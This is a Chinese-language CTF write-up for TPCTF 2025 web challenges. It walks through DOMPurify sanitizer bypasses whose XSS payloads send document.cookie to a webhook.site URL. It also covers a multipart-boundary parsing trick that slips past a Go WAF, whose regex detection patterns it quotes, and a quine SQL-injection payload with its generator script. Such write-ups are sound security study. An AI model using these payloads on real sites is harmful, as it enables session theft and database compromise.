# TPCTF2025部分wp


&lt;!--more--&gt;

## 前言

清华北大办的比赛，质量不用质疑，Misc 的话手搓二维码的时候一直对不上，貌似是上下颠倒了，qrzybox原来还能自动补全，算是学到了，Web 的话就复现了下 xss 的，其他题看下 wp 再说吧，题目后打 `*` 的是复现

## Web

### baby layout

思路很清楚，可以写 content 和 layout ，然后bot访问指定 url 时会将 flag 注入到访问的的那个网页的 cookie 中，打 xss  带 cookie。可以看到代码中对 content 和 layout 的内容都是用 `DOMPurify.sanitize()` 来进行了个过滤，而且可以在配置文件中看到 dompurify 版本为 3.2.4，应该不是打 0day

我们这里重点看下 content 和 layout 的实现

```
app.post(&#39;/api/post&#39;, (req, res) =&gt; {
  const { content, layoutId } = req.body;
  if (typeof content !== &#39;string&#39; || typeof layoutId !== &#39;number&#39;) {
    return res.status(400).send(&#39;Invalid params&#39;);
  }

  if (content.length &gt; LENGTH_LIMIT) return res.status(400).send(&#39;Content too long&#39;);

  const layout = req.session.layouts[layoutId];
  if (layout === undefined) return res.status(400).send(&#39;Layout not found&#39;);

  const sanitizedContent = DOMPurify.sanitize(content);
  //将 layout 中的 {{content}} 替换为 content 的值
  const body = layout.replace(/\{\{content\}\}/g, () =&gt; sanitizedContent);

  if (body.length &gt; LENGTH_LIMIT) return res.status(400).send(&#39;Post too long&#39;);

  const id = randomBytes(16).toString(&#39;hex&#39;);
  posts.set(id, body);
  req.session.posts.push(id);

  console.log(`Post ${id} ${Buffer.from(layout).toString(&#39;base64&#39;)} ${Buffer.from(sanitizedContent).toString(&#39;base64&#39;)}`);

  return res.json({ id });
});

app.post(&#39;/api/layout&#39;, (req, res) =&gt; {
  const { layout } = req.body;
  if (typeof layout !== &#39;string&#39;) return res.status(400).send(&#39;Invalid param&#39;);
  if (layout.length &gt; LENGTH_LIMIT) return res.status(400).send(&#39;Layout too large&#39;);

  const sanitizedLayout = DOMPurify.sanitize(layout);

  const id = req.session.layouts.length;
  req.session.layouts.push(sanitizedLayout);
  return res.json({ id });
});
```

可以看到在 content 的实现中是先检测再替换，也就是说我们可以将 payload 分为两段，一段写入 layout ，并将会被过滤的部分替换为 {{content}}，第二段写入 content，值就为会被过滤的部分，这样的话 content 和 layout 都可以绕过 `DOMPurify.sanitize()` 的检测，而且也会将 content 的值拼入 layout 中，形成最后的恶意 payload。而之所以 content 的值不会被过滤，应该是没有形成一个完整的 html ，没被检测到，可以在官方的github 上找到个 demo 来测试一下：[DOMPurify 3.2.4 &#34;Shipwreck&#34;](https://cure53.de/purify)

![image-20250308193105525](https://bu.dusays.com/2025/03/11/67d0451dab4cc.png)

![image-20250308193135429](https://bu.dusays.com/2025/03/11/67d0451da9380.png)

可以看到第二次就被过滤了而第一次却没有被过滤，弹个窗先

layout 为

```
&lt;audio src={{content}}&gt;
```

content 为

```
&#34;a&#34; onloadstart=&#34;alert(1)&#34;
```

create post 就弹窗了

![image-20250308193538228](https://bu.dusays.com/2025/03/11/67d0451dcbfb2.png)

源码也可以看到是成功插入了的

![image-20250308193839895](https://bu.dusays.com/2025/03/11/67d0451db28e8.png)

带下 cookie

```
&#34;a&#34; onloadstart=&#34;fetch(&#39;https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=&#39; &#43; document.cookie)&#34;
```

![image-20250308194217163](https://bu.dusays.com/2025/03/11/67d0451de841a.png)

后面两道加强题都可以参考：https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists

### safe layout*

加强了过滤

![image-20250309201717396](https://bu.dusays.com/2025/03/11/67d0451dcd13f.png)

将 `ALLOWED_ATTR` 置为空，也就是不能引用属性，但跟进后会发现还可以用 `ALLOW_DATA_ATTR` 和 `ALLOW_ARIA_ATTR`

![image-20250311133736480](https://bu.dusays.com/2025/03/11/67d0451dea2b2.png)

也就是说我们依然可以用自定义的 data，后接恶意代码即可

layout

```
&lt;audio data-a={{content}}&gt;
```

content

```
a&#34; src=&#34;a&#34; onloadstart=&#34;fetch(&#39;https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=&#39; &#43; document.cookie)&#34;
```

必须有 src 属性，不然会报错

![image-20250311193529235](https://bu.dusays.com/2025/03/11/67d0451ee3b22.png)

### safe layout revenge*

这道就修复了上面的非预期，把 `ALLOW_ARIA_ATTR` 和 `ALLOW_DATA_ATTR` 都设为了 false

从 [出题人的wp](https://ouuan.moe/post/2025/03/tpctf-2025#baby-layout-81-solves) 中看到dompurify非常严格，`&lt;style&gt;`中的任何HTML标签都将被过滤。但是，正则表达式仅检查 `/&lt;[/\ w]/` ，因此不会过滤 `&lt;{{content}}` ，可以用其来绕过恶意的标签

但不能直接写在 style 标签里，因为 style 标签中的会被当作 css 解析，所以把 `{{content}}` 包裹在 style 便签里即可，第一个 `{{content}}` 是用来闭合第一个 style 标签的，而前面的 a 的话是开一个新的节点，干扰html解析规则啥的，没太懂，但是不加就会解析失败

layout

```
a&lt;style&gt;{{content}}&lt;{{content}}&lt;/style&gt;
```

content

```
img src=&#34;a&#34; onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`&#43;document.cookie) &lt;style&gt;&lt;/style&gt;
```

### supersqli

manage.py 加个参数启动服务器，方便调试

```
    if len(sys.argv) == 1:
        sys.argv.append(&#34;runserver&#34;)
```

在 `supersqli\web_deploy\src\blog\views.py` 文件中的 flag 函数中我们可以发现存在 sql 注入

![image-20250310174204987](https://bu.dusays.com/2025/03/11/67d0451f60557.png)

但是 `supersqli\web_deploy\simplewaf\main.go` 中的 waf 限制的很死

```
var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s&#43;table|--|#|\*\/|\/\*)`)

var rcePattern = regexp.MustCompile(`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.&#43;\))`)

var hotfixPattern = regexp.MustCompile(`(?i)(select)`)
```

注意到在 go 中加了个判断，判断 `mediaType` 是否为 `multipart/form-data`

![image-20250310210644382](https://bu.dusays.com/2025/03/11/67d0451f41c4d.png)

找到一篇有关利用 `multipart/form-data` 解析差异实现绕过的文章：https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/

但文章中用的是 flask 框架，貌似在这里的 Django 中行不通，看下 Django 框架中对 `multipart/form-data` 处理，跟进到 multipartparser.py 中可以发现 Django 是通过请求头中的 `Content-Disposition` 字段来区分每个字段

![image-20250310211645892](https://bu.dusays.com/2025/03/11/67d0451f0d968.png)

而在 go 中的 request.go 的 multipartReader 函数中

```
func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) {
	v := r.Header.Get(&#34;Content-Type&#34;)
	if v == &#34;&#34; {
		return nil, ErrNotMultipart
	}
	if r.Body == nil {
		return nil, errors.New(&#34;missing form body&#34;)
	}
	d, params, err := mime.ParseMediaType(v)
	if err != nil || !(d == &#34;multipart/form-data&#34; || allowMixed &amp;&amp; d == &#34;multipart/mixed&#34;) {
		return nil, ErrNotMultipart
	}
	boundary, ok := params[&#34;boundary&#34;]
	if !ok {
		return nil, ErrMissingBoundary
	}
	return multipart.NewReader(r.Body, boundary), nil
}
```

可以看到这里是用 `boundary` 的值来分隔 multipart 请求中的各个部分，截止符的话当然就是 `boundary` 的值加上 `--` 了

经过上面的分析我们发现 go 和 Django 中用来区分不同字段的方法是不一样的，可以利用这个解析差异来绕过 waf ，请求是先经过 go 处理再经过 Django 的，我们可以先用 `--boundary--` 来截止，然后再传 password 的值。当请求体为

```
Content-Type: multipart/form-data; boundary=----xxx
Content-Length: 137

------xxx
Content-Disposition: form-data; name=&#34;username&#34;

admin
------xxx--
Content-Disposition: form-data; name=&#34;password&#34;;

111
```

go 只会解析 `------xxx--` 前的值，也就是返回 

```
请求的 POST 参数:
username = admin
```

而 Django 则会返回两个参数的值

```
请求的 POST 参数:
username = admin
password = 111
```

后面 sql 注入的话是打 sqlite，盲注不知道为啥打不了，然后发现能打 quine 注入，这里只判断了传入的 password 是否相同，确实也比较符合其利用场景，用文章中的脚本构造下 payload：https://blog.csdn.net/qq_35782055/article/details/130348274，稍微改下，没过滤空格，不用 repalce 为 `/**/`

```
sql = input (&#34;输入你的sql语句,不用写关键查询的信息  形如 1&#39;union select #\n&#34;)
sql2 = sql.replace(&#34;&#39;&#34;,&#39;&#34;&#39;)
base = &#34;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&#34;
final = &#34;&#34;
def add(string):
    if (&#34;--&#43;&#34; in string):
        tem = string.split(&#34;--&#43;&#34;)[0] &#43; base &#43; &#34;--&#43;&#34;
    if (&#34;#&#34; in string):
        tem = string.split(&#34;#&#34;)[0] &#43; base &#43; &#34;#&#34;
    return tem
def patch(string,sql):
    if (&#34;--&#43;&#34; in string):
        return sql.split(&#34;--&#43;&#34;)[0] &#43; string &#43; &#34;--&#43;&#34;
    if (&#34;#&#34; in string):
        return sql.split(&#34;#&#34;)[0] &#43; string &#43; &#34;#&#34;

res = patch(base.replace(&#34;.&#34;,add(sql2)),sql).replace(&#34;&#39;.&#39;&#34;,&#39;&#34;.&#34;&#39;)

print(res)
```

最后经尝试发现是两列，因此传入 `1&#39; union select 1,2,--&#43;` ，得到 payload

```
1&#39; union select 1,2,replace(replace(&#39;1&#34; union select 1,2,replace(replace(&#34;.&#34;,char(34),char(39)),char(46),&#34;.&#34;)--&#43;&#39;,char(34),char(39)),char(46),&#39;1&#34; union select 1,2,replace(replace(&#34;.&#34;,char(34),char(39)),char(46),&#34;.&#34;)--&#43;&#39;)--&#43;
```

![image-20250310222255991](https://bu.dusays.com/2025/03/11/67d0451f2a13e.png)



---

> 作者: 6s6  
> URL: http://localhost:1313/posts/c1e7c5b/  

